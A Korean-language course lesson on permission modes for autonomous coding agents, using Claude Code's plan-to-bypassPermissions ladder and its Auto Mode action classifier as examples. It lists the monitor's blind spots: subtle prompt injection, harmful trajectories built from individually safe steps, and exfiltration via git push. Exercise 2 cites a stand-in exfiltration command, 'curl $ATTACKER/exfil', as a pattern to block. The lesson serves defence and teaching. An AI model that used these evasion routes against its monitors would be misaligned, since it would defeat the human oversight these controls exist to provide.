# 자율 에이전트를 위한 권한 모드

> 권한 사다리 — 모든 행동을 검토하는 단계부터 모든 것을 승인하는 단계까지 점진적인 자율성 수준 — 는 하네스가 자율 에이전트가 승인 요청 없이 수행할 수 있는 작업을 통제하는 방식입니다. 이 강의의 예제인 Claude Code는 여섯 가지 모드와 이를 노출합니다: "plan"은 모든 행동 전에 승인 요청을 하며, "default" (UI에서 "Manual"로 표기)는 위험한 행동에만 승인 요청을 하고, "acceptEdits"는 파일 쓰기를 자동 승인하지만 셸 실행은 여전히 확인하며, "bypassPermissions"는 모든 것을 승인합니다. Auto Mode — `auto` 권한 모드 — 는 개별 행동 승인 대신, 실행 전 각 행동을 검토하고 요청 범위를 벗어나는 모든 것을 차단하는 별도의 분류기 모델로 대체합니다. 행동 예산은 `max_turns` 및 `max_budget_usd`를 통해 강제됩니다. `auto`의 가용성은 플랜, 조직 활성화, 모델, 제공자에 따라 달라지며 — Anthropic은 분류기만으로는 충분하지 않다고 명시합니다.

**유형:** Learn
**언어:** Python (표준 라이브러리, 2단계 분류기 시뮬레이터)
**선수 요건:** 15단계 · 01강 (장기 에이전트), 15단계 · 09강 (코딩 에이전트 현황)
**시간:** 약 45분

## 문제점

사용자 머신에서 실행되는 자율 코딩 에이전트는 별도의 보안 범주입니다. 공격 표면은 에이전트가 접근할 수 있는 모든 것 — 파일 시스템, 네트워크, 자격 증명, 클립보드, 모든 브라우저 탭, 모든 열린 터미널 — 입니다. Bruce Schneier와 다른 전문가들은 이를 공개적으로 지적했습니다: 컴퓨터 사용 에이전트는 챗봇의 "기능 업데이트"가 아니라, 새로운 위험 프로필을 가진 새로운 종류의 도구입니다.

Claude Code의 권한 시스템은 Anthropic의 답변입니다. 하나의 "자율 / 비자율" 스위치 대신, 기능 사다리를 포괄하는 여섯 가지 모드가 있습니다: plan → default → acceptEdits → … → bypassPermissions. 각 모드는 속도와 행동별 검토 사이의 다른 트레이드오프입니다. Auto Mode (2026년 3월)는 승인 과정을 사용자의 핵심 경로에서 벗어나게 하는 별도의 분류기 모델을 추가합니다: 실행 전 각 행동을 검토하고 요청 범위를 벗어나는 모든 것을 차단합니다.

엔지니어링 질문: 이 시스템은 무엇을 포착하고, 무엇을 놓치며, 주어진 작업에는 실제로 어떤 모드가 적절합니까?

## 개념

### 여섯 가지 권한 모드

| 모드 | 동작 | 사용 시점 |
|---|---|---|
| `plan` | 에이전트가 계획을 제안하고, 사용자가 전체 계획을 승인하며, 모든 실행 전 모든 작업이 검토됩니다. | 낯선 작업; 프로덕션 인접 코드; 저장소에서 에이전트를 처음 사용하는 경우 |
| `default` | UI에서 "Manual"로 표시됩니다. 에이전트가 작업을 실행하며, "위험한" 작업(셸 실행, 파괴적 작업, 네트워크 호출)에 대해 사용자에게 확인을 요청합니다. | 대부분의 인터랙티브 코딩 세션 |
| `acceptEdits` | 파일 쓰기는 자동 승인되며, 셸 실행 및 네트워크 호출은 여전히 확인을 요청합니다. | 여러 파일에 걸친 리팩토링 패스 |
| `auto` | 별도의 분류기 모델이 실행 전 각 작업을 검토하며, 요청 범위를 초과하는 모든 것을 차단합니다. | 제한된 작업 공간에서의 장기 무인 실행 |
| `dontAsk` | 확인을 요청하지 않으며, 권한 규칙에 사전 승인되지 않은 작업은 거부됩니다. | 임시 샌드박스, CI 작업, 연구 스크립트 |
| `bypassPermissions` | 모든 것을 승인합니다. "버릴 의향이 있는 임시 컨테이너 내에서만 사용"으로 문서화되어 있습니다. |

(위의 이름은 공개된 Claude Code 문서와 일치합니다. UI에서는 `default`을 "Manual"로 표시합니다.)

### 한 페이지에 담긴 Auto Mode

Auto Mode (2026년 3월 24일 출시)는 작업 단위 승인을 모델에 위임하는 최초의 권한 모드입니다. 구조:

1. **별도의 분류기 모델.** 실행 전 모든 제안된 작업을 검토하며, 선언된 작업과 세션의 현재 상태를 기준으로 판단하고, 요청 범위를 초과하는 모든 것을 차단합니다. 차단된 작업은 사용자에게 반환됩니다.
2. **제한된 가용성.** `auto` 제공 여부는 플랜, 조직 활성화, 모델 및 제공자에 따라 달라집니다.

예산 제어는 분류기와 함께 작동합니다:

- `max_turns` — 세션 내 총 반복 횟수.
- `max_budget_usd` — 세션을 중단하는 비용 상한.
- 도구별 작업 수 제한 (N번 이상의 `WebFetch` 호출 금지 등).

### 시스템이 포착하는 것

- 주입된 지시가 알려진 위험한 작업 형태에 매핑되는 도구 입력에 대한 단순한 프롬프트 주입.
- 반복적인 도구 루프 — 분류기는 작업 N+1이 작업 N과 거의 동일하며, 5번 연속 반복되는 것을 감지할 수 있습니다.
- 파일 편집 전용 세션에서 명백히 범위를 벗어난 셸 명령.

### 시스템이 놓칠 수 있는 부분

- **미묘한 프롬프트 주입**은 단일 플래그된 동작을 생성하지 않으면서 동작을 변조합니다. 간접 프롬프트 주입(Indirect Prompt Injection)은 완전히 패치 가능한 취약점이 아닙니다 (OpenAI 준비 책임자, 2025, 브라우저 에이전트 관련 — 11강 참조).
- **의미론적 수준의 오작동.** 개별 동작은 모두 안전해 보일 수 있지만, 구성된 궤적은 해로울 수 있습니다. 분류기는 동작을 판단하며, 사용자의 의도를 다시 도출하지 않습니다.
- **합법적인 채널을 통한 유출.** 소유한 파일에 데이터를 쓴 후 `git push`하여 공개 저장소로 푸시하는 것은 허용된 동작들의 연속이며, 그 구성이 문제입니다.

### 연구 프리뷰 프레이밍

Anthropic은 Auto Mode를 연구 프리뷰로 출시했습니다. 문서에서는 분류기가 계층일 뿐 해결책이 아니라고 명시합니다. 사용자는 Auto Mode를 예산, 허용 목록, 격리된 워크스페이스, 궤적 감사와 결합해야 합니다 (12-16강). 프리뷰 프레이밍은 문서화된 평가 대 배포 간 격차도 반영합니다 (1강) — 오프라인 평가를 통과한 분류기는 사용자 컨텍스트가 모호한 실제 세션에서는 다르게 동작할 수 있습니다.

### 이 사다리가 워크플로우에서 위치하는 곳

- 익숙하지 않은 작업: `plan`에서 시작하세요. 계획을 읽는 것이 잘못된 실행을 롤백하는 것보다 저렴합니다.
- 알려진 리팩토링: `acceptEdits`은 많은 확인 클릭을 절약합니다.
- 비감독 백그라운드 실행: 폭발 반경을 측정한 워크스페이스 내에서만 `auto`를 사용하세요 (자격 증명이 없고, 프로덕션 마운트가 없으며, 선택하지 않은 아웃바운드 트래픽이 없는 곳).
- 임시 컨테이너: 컨테이너와 그 자격 증명이 일회용인 경우에만 `dontAsk` / `bypassPermissions`가 허용됩니다.

## 사용하기

`code/main.py`는 동작 검토 분류기를 2단계 파이프라인으로 시뮬레이션합니다 — 교육적 단순화입니다. 실제 `auto` 모드는 문서화된 2단계 계약이 아닌 별도의 분류기 모델로 뒷받침됩니다. 1단계는 제안된 동작에 대한 저렴한 키워드 규칙이며, 2단계는 더 느린 다중 규칙 리뷰어입니다. 드라이버는 짧은 합성 궤적(안전한 동작, 프롬프트 주입 시도, 반복 루프)을 입력하고 분류기가 포착하는 위치와 놓치는 위치를 보여줍니다.

## 연습 문제

1. `code/main.py`을 실행해 보세요. 합성 작업 유형 중 Stage 1에서는 절대 플래그되지 않지만 Stage 2에서는 항상 잡히는 것은 무엇인가요? 둘 다 잡히지 않는 것은 무엇인가요?

2. Stage 1 규칙 집합을 확장하여 특정 알려진 나쁜 형태(예: `curl $ATTACKER/exfil`)를 잡도록 해 보세요. 선의 작업 샘플에서 오탐(false-positive)률을 측정해 보세요.

3. Anthropic의 "How the agent loop works" 문서를 읽어 보세요. `default` 모드에서 에이전트가 기본적으로 접촉하는 모든 외부 상태를 나열해 보세요. `auto`을 무인 상태로 실행하기 전에 별도로 게이트해야 하는 것은 무엇인가요?

4. 24시간 무인 실행 예산을 설계해 보세요: `max_turns`, `max_budget_usd`, 도구별 상한, 허용 목록. 각 숫자를 정당화해 보세요.

5. 개별 작업은 모두 분류기에 의해 승인되지만, 합성된 행동은 정렬되지 않은 궤적 하나를 설명해 보세요. (14강은 킬 스위치와 카나리 토큰이 이를 어떻게 처리하는지 다룹니다.)
